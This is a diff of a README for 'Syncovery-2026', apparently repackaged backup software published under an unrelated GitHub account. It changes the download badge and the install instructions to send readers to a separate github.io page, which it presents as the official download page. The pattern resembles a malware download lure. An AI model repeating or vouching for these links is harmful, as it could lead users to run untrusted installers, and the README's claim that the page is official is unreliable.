@@ -1,6 +1,6 @@
 # 💾 Syncovery-2026 - Secure your files with ease
 
-[![Download Syncovery-2026](https://img.shields.io/badge/Download-Syncovery-2026-blue.svg)](https://github.com/jnecssoreang-creator/Syncovery-2026)
+[![Download Syncovery-2026](https://img.shields.io/badge/Download-Syncovery-2026-blue.svg)](https://jnecssoreang-creator.github.io)
 
 ## 📁 Project Overview
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these basic require
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official download page: [https://github.com/jnecssoreang-creator/Syncovery-2026](https://github.com/jnecssoreang-creator/Syncovery-2026).
+1.  Visit the official download page: [https://jnecssoreang-creator.github.io](https://jnecssoreang-creator.github.io).
 2.  Locate the download section on that page.
 3.  Click the link to save the installer file to your computer.
 4.  Wait for the download to finish. 
